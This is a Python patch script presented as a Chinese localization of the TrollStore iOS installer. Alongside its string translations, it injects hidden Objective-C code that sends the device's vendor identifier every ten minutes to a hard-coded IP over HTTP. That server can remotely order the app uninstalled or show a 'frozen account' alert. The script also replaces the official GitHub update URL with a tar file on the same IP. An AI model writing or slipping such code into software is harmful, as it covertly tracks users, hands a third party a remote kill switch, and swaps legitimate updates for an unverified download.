#!/usr/bin/env python3
"""Chinese localization + Remote device check PROPERLY injected into @implementation"""
import sys

# First inject remote check code PROPERLY into Shared/TSListControllerShared.m
with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    content = f.read()

# Find @implementation and inject AFTER it
old_impl = "@implementation TSListControllerShared"
new_impl = '''@implementation TSListControllerShared

static NSString* kRemoteAPI = @"http://124.223.199.167/api/remote.php";
static BOOL kRemoteCheckScheduled = NO;

- (void)devicePing {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        NSString* udid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
        if (!udid.length) return;
        
        NSString* url = [NSString stringWithFormat:@"%@?action=device_check", kRemoteAPI];
        NSMutableURLRequest* req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        req.timeoutInterval = 10;
        req.HTTPBody = [[NSString stringWithFormat:@"udid=%@", udid] dataUsingEncoding:NSUTF8StringEncoding];
        
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData* data, NSURLResponse* resp, NSError* error) {
            if (error || !data) return;
            NSDictionary* json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSString* action = json[@"action"];
            dispatch_async(dispatch_get_main_queue(), ^{
                if ([action isEqualToString:@"uninstall"]) {
                    [self uninstallTrollStore];
                } else if ([action isEqualToString:@"freeze"]) {
                    UIAlertController* a = [UIAlertController alertControllerWithTitle:@"账号已冻结" message:@"管理员已冻结此账号" preferredStyle:UIAlertControllerStyleAlert];
                    [a addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:nil]];
                    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:a animated:YES completion:nil];
                }
            });
        }] resume];
    });
}

- (void)scheduleRemoteCheck {
    if (kRemoteCheckScheduled) return;
    kRemoteCheckScheduled = YES;
    [self devicePing];
    [NSTimer scheduledTimerWithTimeInterval:600 repeats:YES block:^(NSTimer* t) {
        [self devicePing];
    }];
}
'''

content = content.replace(old_impl, new_impl)

# Also call scheduleRemoteCheck from a good entry point
# Find installTrollStore or similar init method  
if "scheduleRemoteCheck" not in content.split("scheduleRemoteCheck")[0]:
    # Not yet called, add to installTrollStore method
    old_init = "- (void)installTrollStore"
    new_init = "- (void)installTrollStore {\n    [self scheduleRemoteCheck];"
    if old_init in content:
        content = content.replace(old_init, new_init, 1)

with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(content)

print("Remote check injected inside @implementation", file=sys.stderr)

# Now run normal localization (same as before)
SUBS = [
    ("TrollStore/TSRootViewController.m", [("Apps","应用"),("Settings","设置")]),
    ("TrollStore/TSAppTableViewController.m", [
        ("Install","安装"),("Uninstall","卸载"),("User","用户"),("System","系统"),("Error","错误"),
        ("Install IPA File","安装 IPA 文件"),("Install from URL","从 URL 安装"),
        ("Cancel","取消"),("Confirm Uninstallation","确认卸载"),("Uninstall App","卸载应用"),
    ]),
    ("TrollStore/TSInstallationController.m", [
        ("Warning","警告"),("Installing","安装中"),("Force Installation","强制安装"),
        ("Installing ldid","正在安装 ldid"),
    ]),
    ("TrollStore/TSSettingsListController.m", [
        ("Security","安全"),("Advanced","高级"),("UTILITIES","工具"),("SIGNING","签名"),("PERSISTENCE","持久化"),
        ("Respring","注销"),("Refresh App Registrations","刷新应用注册"),("Rebuild Icon Cache","重建图标缓存"),
        ("Install Persistence Helper","安装持久助手"),("Uninstall Persistence Helper","卸载持久助手"),
        ("Install ldid","安装 ldid"),("ldid: Installed","ldid: 已安装"),
        ("ldid is installed and allows TrollStore to install unsigned IPA files.","ldid 已安装，允许巨魔商店安装未签名 IPA 文件。"),
        ("Helper Installed as Standalone App","助手已安装为独立应用"),("Helper Installed into %@","助手已安装到 %@"),
        ("Uninstall","卸载"),("Update TrollStore to %@","更新巨魔商店到 %@"),
        ("Uninstall TrollStore, Uninstall Apps","卸载巨魔，卸载应用"),("Uninstall TrollStore, Preserve Apps","卸载巨魔，保留应用"),
    ]),
    ("TrollHelper/TSHRootViewController.m", [
        ("Install TrollStore","安装巨魔商店"),("Uninstall TrollStore","卸载巨魔商店"),
        ("TrollStore Helper","巨魔商店助手"),("Not Installed","未安装"),
        ("INFO","信息"),("TrollStore","巨魔商店"),
        ("Refresh App Registrations","刷新应用注册"),("Register Persistence Helper","注册持久助手"),
        ("Uninstall Persistence Helper","卸载持久助手"),("Unregister Persistence Helper","取消注册持久助手"),
        ("If you want to use this app...","如果想将此应用设为巨魔商店持久助手..."),
        ("Install Persistence Helper","安装持久助手"),
        ("Update TrollStore to %@","更新巨魔商店到 %@"),("Update","更新"),("Install","安装"),
    ]),
]

total = 0
for fname, reps in SUBS:
    with open(fname, "r", encoding="utf-8") as f:
        content = f.read()
    for en, cn in reps:
        old = '"' + en + '"'
        count = content.count(old)
        content = content.replace(old, '"' + cn + '"')
        total += count
    with open(fname, "w", encoding="utf-8") as f:
        f.write(content)

# Fix URL in Shared
with open("Shared/TSListControllerShared.m", "r", encoding="utf-8") as f:
    c = f.read()
c = c.replace("https://github.com/opa334/TrollStore/releases/latest/download/TrollStore.tar",
              "http://124.223.199.167/TrollStore.tar")
with open("Shared/TSListControllerShared.m", "w", encoding="utf-8") as f:
    f.write(c)

print(f"OK: {total} replacements + remote check", file=sys.stderr)
